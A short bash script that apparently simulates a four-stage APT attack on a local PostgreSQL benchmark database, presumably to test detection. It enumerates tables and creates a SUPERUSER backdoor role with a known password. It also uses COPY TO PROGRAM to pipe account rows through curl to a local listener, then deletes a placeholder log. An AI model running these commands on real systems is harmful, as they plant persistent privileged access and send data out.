#!/bin/bash
echo "Simulating Multi-Session APT Attack (Disconnected States)..."

# Stage 1: DB-only unauthorized enumeration (Session 1)
# Hacker connects, does recon, and cleanly disconnects to avoid detection.
echo "Stage 1: Database Enumeration (Session A)"
psql -U postgres -d casce_tpcb -c "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%' AND relname NOT LIKE 'sql_%';" > /dev/null
sleep 2

# Stage 2: Database Privilege Escalation (Session B)
# Hacker reconnects an hour later (simulated by sleep), creates a backdoor, and disconnects.
echo "Stage 2: Privilege Escalation (Session B)"
psql -U postgres -d casce_tpcb -c "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';" > /dev/null 2>&1 || true
sleep 2

# Stage 3: Cross-layer payload delivery (Session C)
# Hacker reconnects again using the main account (or the backdoor) to steal data.
echo "Stage 3: Payload Delivery via Network (Session C)"
psql -U postgres -d casce_tpcb -c "COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';" > /dev/null 2>&1 || true
sleep 1

# Stage 4: OS-only Sabotage (Independent OS shell)
# The hacker never touches the DB, just deletes logs natively via the OS.
echo "Stage 4: OS-only Log Deletion / Sabotage"
sh -c "rm -f /tmp/some_fake_log.log 2>/dev/null || true"

echo "Multi-session APT simulated successfully."
